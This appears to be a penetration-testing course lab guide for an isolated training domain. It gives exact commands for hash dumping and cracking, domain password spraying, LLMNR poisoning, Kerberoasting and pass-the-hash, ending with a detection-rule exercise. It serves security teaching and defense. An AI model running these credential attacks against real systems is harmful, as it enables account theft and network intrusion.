---
session: 4
title: System Hacking I — Vulnerability Analysis, Authentication & Password Attacks
---

# Session 4 — Guided Lab: Find the Weakness, Take the Credential, Then Catch Yourself

The exact commands for every hands-on block. Replace `192.168.56.x` with your own host-only IPs
(DC = `.10`, Win10 = `.20`, Win7 = `.107`, MSF2 = `.102` in these examples). Each lab maps to a section
of the **access plan** deliverable.

## Objective
Turn Session 3's target profile into confirmed vulnerabilities and working credentials against the
`ceh.lab` domain — and write one working detection rule from evidence you generate yourself.

## Targets & authorization (read before anything)
- **Every attack runs against YOUR lab VMs** on the host-only network — the only lawful place to crack, spray,
  poison or roast. The lab gives you the target *and* the authorization; it does not travel.
- Public/THM rooms give their own written authorization for their own boxes only.

## Environment / setup
```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz         # unpack the wordlist once
which hashcat john hydra nxc responder searchsploit evil-winrm
which impacket-GetUserSPNs impacket-GetNPUsers impacket-secretsdump impacket-psexec
# installs if needed:
sudo apt update && sudo apt install -y hashcat john hydra medusa netexec responder impacket-scripts evil-winrm exploitdb seclists
```

## Lab pre-flight (5 min)
```bash
ip a | grep -A2 'ens\|eth'
sudo nmap -sn 192.168.56.0/24                              # Kali + MSF2 + Win7 + Win10 + DC
nmap -Pn -p 88,389,445,636 192.168.56.10                   # DC: Kerberos/LDAP/SMB up
ldapsearch -x -H ldap://192.168.56.10 -s base namingContexts   # → DC=ceh,DC=lab
```
✓ Four targets answer; DC shows 88/389/445; rockyou has ~14M lines.

## Lab 1 — version → CVE → exploit? (16 min) → Access plan: "confirmed vulnerabilities"
```bash
searchsploit vsftpd 2.3.4                                  # Backdoor (Metasploit)
searchsploit samba 3.0.20                                  # usermap_script — CVE-2007-2447
searchsploit unrealircd 3.2.8.1                            # CVE-2010-2075
searchsploit -m unix/remote/16320.rb                       # mirror + read one
nmap -p445 --script smb-vuln-ms17-010 192.168.56.107       # Win7 → VULNERABLE, CVE-2017-0143, CVSS 8.1
searchsploit mod_ssl 2.8.4                                  # Kioptrix — OpenFuck, CVE-2002-0082
```
✓ Each version returns a matching exploit; you recorded CVE + CVSS + public-exploit yes/no per service. Don't fire anything.

## Lab 2 — automated scan demo + false positive (8 min) → triage skill
```bash
# Nessus: New Scan → Basic Network Scan → 192.168.56.102,107,20,10 → Launch
# Greenbone: Scans → Tasks → New Task → same targets → Start
# then pick a "Critical" and CONFIRM the real version by hand:
nxc smb 192.168.56.102        # is the reported version actually the vulnerable one?
```
✓ You named the most/least vulnerable host and judged one "critical" as real-and-reachable or a false positive.

## Lab 3 — crack local hashes (15 min) → Access plan: "credentials obtained"
```bash
# Windows SAM (needs a local admin credential)
impacket-secretsdump ./Administrator@192.168.56.107        # Win7; prompts for password
awk -F: 'NF>3{print $4}' sam_dump.txt > sam.txt            # NT hashes
hashcat -m 1000 sam.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 sam.txt --show                             # → labuser:Summer2024 ...
# Linux /etc/shadow (Metasploitable2)
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
john --show unshadowed.txt
# failure case: no rules → "Exhausted"; add -r best64.rule and it cracks
```
✓ NT hashes and shadow hashes cracked; you can explain why "Exhausted" ≠ "uncrackable".

## Lab 4 — password spray the domain (14 min) → generates 4625 evidence
```bash
printf 'a.fahmy\nm.said\nn.gamal\nh.rashad\nsvc_backup\n' > users.txt
nxc smb 192.168.56.10 -u users.txt -p 'Autumn2025!' --continue-on-success
#  [+] hits a.fahmy, n.gamal, h.rashad ;  [-] misses m.said (distinct strong pw)
# SAVE the DC Security log (on the DC):
#   wevtutil epl Security lab4_spray.evtx      (or Event Viewer → Security)
# failure case — trip the lockout:
nxc smb 192.168.56.10 -u m.said -p /usr/share/wordlists/rockyou.txt   # locks after 5 → 4740
```
✓ Spray hits 3/5; DC Security log shows a burst of 4625 (+4771/4768) from your IP — **saved for Lab 7**.

## Lab 5 — LLMNR poison + capture (14 min) → generates a Responder capture
```bash
sudo responder -I eth0 -wv                                  # LLMNR/NBT-NS/mDNS poisoners ON
# on Win10, trigger a failed name lookup (a real user's typo):
#   Explorer / cmd:  \\fileshart\data
# Responder prints:  [SMB] NTLMv2-SSP Hash : ceh.lab\<user>:::<hash>
#   → save the hash line to netntlm.txt
hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 5600 netntlm.txt --show
```
✓ You chose 5600 (NetNTLMv2), not 1000, and cracked it. Capture saved.

## Lab 6 — Kerberoast + AS-REP + pass-the-hash (15 min) → generates 4769 evidence
```bash
# Kerberoast every SPN with a low-priv domain credential:
impacket-GetUserSPNs -dc-ip 192.168.56.10 ceh.lab/a.fahmy -request      # → svc_backup + svc_sql tickets
#   save both $krb5tgs$ hashes to spn.txt
hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 spn.txt --show                                          # svc_backup cracks; svc_sql: Exhausted (strong pw)
# AS-REP roast (any no-preauth account):
impacket-GetNPUsers -dc-ip 192.168.56.10 ceh.lab/ -usersfile users.txt -no-pass
# pass-the-hash + a shell (no cracking):
impacket-secretsdump ceh.lab/svc_backup@192.168.56.10
nxc smb 192.168.56.20 -u Administrator -H <NT-hash>
evil-winrm -i 192.168.56.20 -u svc_backup -p '<cracked>'
# SAVE the DC Security log:  wevtutil epl Security lab6_kerberoast.evtx
```
✓ svc_backup cracked (13100); svc_sql roasted but never cracks (the honest limit); pass-the-hash proven; 4769 burst saved.

## Lab 7 — write the detection rule (16 min) → the signature exercise
```powershell
# identify the attack from evidence alone (on the DC or exported log):
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} |
  Group-Object {$_.Properties[5].Value} | Sort-Object Count -Descending
# many DISTINCT accounts, ONE source, short window → password spray
```
Then write ONE working rule (Sigma / SPL / KQL) for "one source → many distinct accounts → short window".
Worked Sigma is on the teaching page (P24); complete an SPL or KQL skeleton yourself.
✓ Deliverable: a complete rule + threshold/window + one false-positive sentence + ATT&CK mapping (T1110.003 / T1558.003 / T1557.001) + one sentence on beating a *slow* spray.

## Lab 8 — assemble the access plan (12 min) → the deliverable
Fill `exercises/session-04/access_plan_template.md`, one block per host, from your Lab 1–6 output, plus the
single chosen way in per host and the Lab 7 rule as an appendix.
✓ Ranked, sourced, exact CVEs, credentials with method — not raw tool dumps.

## Success check (show your instructor)
- A per-host vuln line with CVE + CVSS + public-exploit yes/no (Lab 1).
- Cracked SAM and shadow hashes; you can explain "Exhausted" ≠ uncrackable (Lab 3).
- A spray that hits 3/5 and a saved 4625 burst (Lab 4).
- A captured + cracked NetNTLMv2 (mode 5600) (Lab 5).
- A cracked Kerberoast ticket (13100), a roasted-but-uncracked strong one, and a pass-the-hash (Lab 6).
- One complete, working detection rule (Lab 7).
- A ranked access plan for all four hosts (Lab 8).

## Common mistakes
- Cracking NetNTLMv2 with `-m 1000` (it's 5600) — wrong mode, silent failure.
- Concluding "uncrackable" after rockyou with no rules — add `-r best64.rule` first.
- Brute-forcing one account and locking it — spray instead (one password, many users).
- Forgetting to save the DC Security log — Lab 7 needs the 4625/4769 evidence.
- Reporting a scanner "critical" without confirming the real version — that's a false positive waiting to embarrass you.
- Firing an exploit in Lab 1 — that's Session 5; today you only confirm a way in.
